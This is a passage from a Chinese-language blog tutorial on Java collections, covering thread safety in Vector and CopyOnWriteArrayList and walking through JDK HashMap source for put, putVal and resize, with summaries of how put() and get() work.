<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>两个线程对同一个集合进行访问时，如果一个线程中对该集合进行删除或添加操作，另一个线程在通过迭代器访问时，就会抛出异常。所以就需要使用者自己保证迭代器的获取与集合的操作在一个线程中进行。</p>
<h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><p>代码示例：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">E</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    modCount<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token function">ensureCapacityHelper</span><span class="token punctuation">(</span>elementCount <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    elementData<span class="token punctuation">[</span>elementCount<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">></span></span> <span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Itr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>可以看到Vector底层也是类似的通过加锁操作，来保证线程安全问题。但如果我们用上面的测试代码替换为Vector，发现也会报错。</p>
<p>在 Java 集合框架中，迭代器的并发修改检测通常依赖于集合内部的一个计数器（modCount）。当集合结构发生变化时，这个计数器就会增加。如果迭代器发现 modCount 与创建迭代器时的值不同，则会抛出 <code>ConcurrentModificationException</code>。</p>
<h3 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h3><p>也是一个线程安全版的ArrayList，适用于读多写少的场景，其中所有可变操作（add、set等等）都是通过对底层数组进行一次新的复制来实现的。所以频繁的写是消耗性能的。</p>
<p>代码示例：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">E</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">final</span> <span class="token class-name">ReentrantLock</span> lock <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>lock<span class="token punctuation">;</span>
    lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> elements <span class="token operator">=</span> <span class="token function">getArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> len <span class="token operator">=</span> elements<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> newElements <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>elements<span class="token punctuation">,</span> len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        newElements<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>
        <span class="token function">setArray</span><span class="token punctuation">(</span>newElements<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
        lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到这里使用了<code>ReentrantLock</code>来进行加锁操作，并且每次赋值时，都赋值了一个新的数组。</p>
<p>当我们再通过CopyOnWriteArray来测试时，发现并没有报错，并且一个线程对集合的操作，并不影响另一个线程迭代器遍历数组。但问题就是消耗性能，因为每次都进行拷贝操作，所以也就需要注意内存问题。</p>
<h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><blockquote>
<p>HashMap存储的是Key,Value.也就是一个个小节点，所以内部封装了Node类来存储值，再通过Node数组来存放一个个Node，这里有意思的就是Node它也是一个链表结构，当对key求Hash值时，如果数组上这个位置已经有值了，则直接绑定到之前加入节点的后面，很方便。既能做到查询快，插入也快。</p>
</blockquote>
<blockquote>
<p>HashMap中Put到底是怎么走的？</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">V</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">K</span> key<span class="token punctuation">,</span> <span class="token class-name">V</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  			<span class="token comment">//先对key求一个Hash值</span>
        <span class="token keyword">return</span> <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token class-name">V</span> <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token keyword">int</span> hash<span class="token punctuation">,</span> <span class="token class-name">K</span> key<span class="token punctuation">,</span> <span class="token class-name">V</span> value<span class="token punctuation">,</span> <span class="token keyword">boolean</span> onlyIfAbsent<span class="token punctuation">,</span>
                   <span class="token keyword">boolean</span> evict<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  			<span class="token comment">//这里初始化一个Node数组，一个Node节点</span>
        <span class="token class-name">Node</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> tab<span class="token punctuation">;</span> <span class="token class-name">Node</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> p<span class="token punctuation">;</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> i<span class="token punctuation">;</span>
				<span class="token comment">//判定Node数字有没有初始化过</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>tab <span class="token operator">=</span> table<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token punctuation">(</span>n <span class="token operator">=</span> tab<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
          	<span class="token comment">//如果没有，说明现在的Node数组是一个空数组，需要进行扩容后存放数据</span>
            n <span class="token operator">=</span> <span class="token punctuation">(</span>tab <span class="token operator">=</span> <span class="token function">resize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
  			<span class="token comment">//通过数组中Hash位置判定，是否之前插入过数据</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p <span class="token operator">=</span> tab<span class="token punctuation">[</span>i <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> hash<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
 						<span class="token comment">//如果没有直接在该节点上插入一个新的Node节点</span>
          	tab<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">newNode</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
          	<span class="token comment">//这里就是如果之前插入过一个节点，那现在就需要将新来的节点和之前的连接</span>
            <span class="token class-name">Node</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e<span class="token punctuation">;</span> <span class="token class-name">K</span> k<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span>
                <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> p<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> <span class="token punctuation">(</span>key <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                e <span class="token operator">=</span> p<span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token keyword">instanceof</span> <span class="token class-name">TreeNode</span><span class="token punctuation">)</span>
                e <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">TreeNode</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">)</span>p<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">putTreeVal</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> tab<span class="token punctuation">,</span> hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> binCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>binCount<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        p<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token function">newNode</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>binCount <span class="token operator">>=</span> <span class="token constant">TREEIFY_THRESHOLD</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// -1 for 1st</span>
                            <span class="token function">treeifyBin</span><span class="token punctuation">(</span>tab<span class="token punctuation">,</span> hash<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span>
                        <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> e<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> <span class="token punctuation">(</span>key <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    p <span class="token operator">=</span> e<span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// existing mapping for key</span>
                <span class="token class-name">V</span> oldValue <span class="token operator">=</span> e<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>onlyIfAbsent <span class="token operator">||</span> oldValue <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
                    e<span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>
                <span class="token function">afterNodeAccess</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> oldValue<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
  			<span class="token comment">//统计有多少数据</span>
        <span class="token operator">++</span>modCount<span class="token punctuation">;</span>
				<span class="token comment">//判定是否需要扩容</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">++</span>size <span class="token operator">></span> threshold<span class="token punctuation">)</span>
            <span class="token function">resize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">afterNodeInsertion</span><span class="token punctuation">(</span>evict<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token class-name">Node</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">resize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Node</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> oldTab <span class="token operator">=</span> table<span class="token punctuation">;</span>
  			<span class="token comment">//原来数组的大小</span>
        <span class="token keyword">int</span> oldCap <span class="token operator">=</span> <span class="token punctuation">(</span>oldTab <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> oldTab<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
  			<span class="token comment">//老的临界点值</span>
        <span class="token keyword">int</span> oldThr <span class="token operator">=</span> threshold<span class="token punctuation">;</span>
        <span class="token keyword">int</span> newCap<span class="token punctuation">,</span> newThr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>oldCap <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>oldCap <span class="token operator">>=</span> <span class="token constant">MAXIMUM_CAPACITY</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                threshold <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">MAX_VALUE</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> oldTab<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>newCap <span class="token operator">=</span> oldCap <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token constant">MAXIMUM_CAPACITY</span> <span class="token operator">&amp;&amp;</span>
                     oldCap <span class="token operator">>=</span> <span class="token constant">DEFAULT_INITIAL_CAPACITY</span><span class="token punctuation">)</span>
                newThr <span class="token operator">=</span> oldThr <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// double threshold</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>oldThr <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// initial capacity was placed in threshold</span>
            newCap <span class="token operator">=</span> oldThr<span class="token punctuation">;</span>
  			<span class="token comment">//这里一般就是第一次使用时，进行默认初始化 容量：16   边界值：12   加载因子：0.75</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>               <span class="token comment">// zero initial threshold signifies using defaults</span>
            newCap <span class="token operator">=</span> <span class="token constant">DEFAULT_INITIAL_CAPACITY</span><span class="token punctuation">;</span>
            newThr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">DEFAULT_LOAD_FACTOR</span> <span class="token operator">*</span> <span class="token constant">DEFAULT_INITIAL_CAPACITY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>newThr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">float</span> ft <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>newCap <span class="token operator">*</span> loadFactor<span class="token punctuation">;</span>
            newThr <span class="token operator">=</span> <span class="token punctuation">(</span>newCap <span class="token operator">&lt;</span> <span class="token constant">MAXIMUM_CAPACITY</span> <span class="token operator">&amp;&amp;</span> ft <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span><span class="token constant">MAXIMUM_CAPACITY</span> <span class="token operator">?</span>
                      <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ft <span class="token operator">:</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">MAX_VALUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        threshold <span class="token operator">=</span> newThr<span class="token punctuation">;</span>
        <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"rawtypes"</span><span class="token punctuation">,</span><span class="token string">"unchecked"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  			<span class="token comment">// 一般是按照一倍扩容的</span>
        <span class="token class-name">Node</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> newTab <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">[</span>newCap<span class="token punctuation">]</span><span class="token punctuation">;</span>
        table <span class="token operator">=</span> newTab<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>oldTab <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> oldCap<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Node</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e<span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e <span class="token operator">=</span> oldTab<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    oldTab<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
                        newTab<span class="token punctuation">[</span>e<span class="token punctuation">.</span>hash <span class="token operator">&amp;</span> <span class="token punctuation">(</span>newCap <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>
                    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token keyword">instanceof</span> <span class="token class-name">TreeNode</span><span class="token punctuation">)</span>
                        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">TreeNode</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span><span class="token punctuation">)</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> newTab<span class="token punctuation">,</span> j<span class="token punctuation">,</span> oldCap<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">// preserve order</span>
                        <span class="token class-name">Node</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> loHead <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span> loTail <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                        <span class="token class-name">Node</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> hiHead <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span> hiTail <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                        <span class="token class-name">Node</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> next<span class="token punctuation">;</span>
                        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>
                            next <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">&amp;</span> oldCap<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">if</span> <span class="token punctuation">(</span>loTail <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
                                    loHead <span class="token operator">=</span> e<span class="token punctuation">;</span>
                                <span class="token keyword">else</span>
                                    loTail<span class="token punctuation">.</span>next <span class="token operator">=</span> e<span class="token punctuation">;</span>
                                loTail <span class="token operator">=</span> e<span class="token punctuation">;</span>
                            <span class="token punctuation">&#125;</span>
                            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                                <span class="token keyword">if</span> <span class="token punctuation">(</span>hiTail <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
                                    hiHead <span class="token operator">=</span> e<span class="token punctuation">;</span>
                                <span class="token keyword">else</span>
                                    hiTail<span class="token punctuation">.</span>next <span class="token operator">=</span> e<span class="token punctuation">;</span>
                                hiTail <span class="token operator">=</span> e<span class="token punctuation">;</span>
                            <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e <span class="token operator">=</span> next<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>loTail <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            loTail<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                            newTab<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> loHead<span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>hiTail <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            hiTail<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
                            newTab<span class="token punctuation">[</span>j <span class="token operator">+</span> oldCap<span class="token punctuation">]</span> <span class="token operator">=</span> hiHead<span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> newTab<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="put-⽅法原理"><a href="#put-⽅法原理" class="headerlink" title="put() ⽅法原理"></a>put() ⽅法原理</h4><ol>
<li>先将Key，Value封装为一个Node。</li>
<li>通过HashCode()得出Hash值</li>
<li>通过哈希函数将Hash值装换为数组下标<ol>
<li>如果这个位置没有任何元素，则直接插入Node</li>
<li>如果已经有了Node链表，将当前Node的key与链表上每一个Key进行equals比较<ol>
<li>如果都返回false，则插入链表末尾</li>
<li>如果有true，则直接新的Node的value替代原来的。（保证不可重复）</li>
</ol>
</li>
</ol>
</li>
</ol>
<blockquote>
<p>注意：<code>HashMap</code>中允许key，value为null，但只能有一个</p>
<p>​     <code>HashTable</code>中key和value都不能为空</p>
</blockquote>
<h4 id="get-方法原理"><a href="#get-方法原理" class="headerlink" title="get() 方法原理"></a>get() 方法原理</h4><ol>
<li>通过key的HashCode()方法求出Hash值</li>
<li>通过哈希函数将hash值转为数组的下标</li>
<li>通过下标定位到数组的某个位置<ol>
<li>如果没有链表，直接返回Null</li>
<li>如果有链表，以此进行匹配每个节点上的key通过equals进行比较<ol>
<li>如果都为false，则返回null</li>
<li>如果为true，则返回值</li>
</ol>
</li>
</ol>
</li>
</ol>
<blockquote>
<p>放在HashMap中的key元素需要同时重写hashCode()和equals()方法</p>
</blockquote>
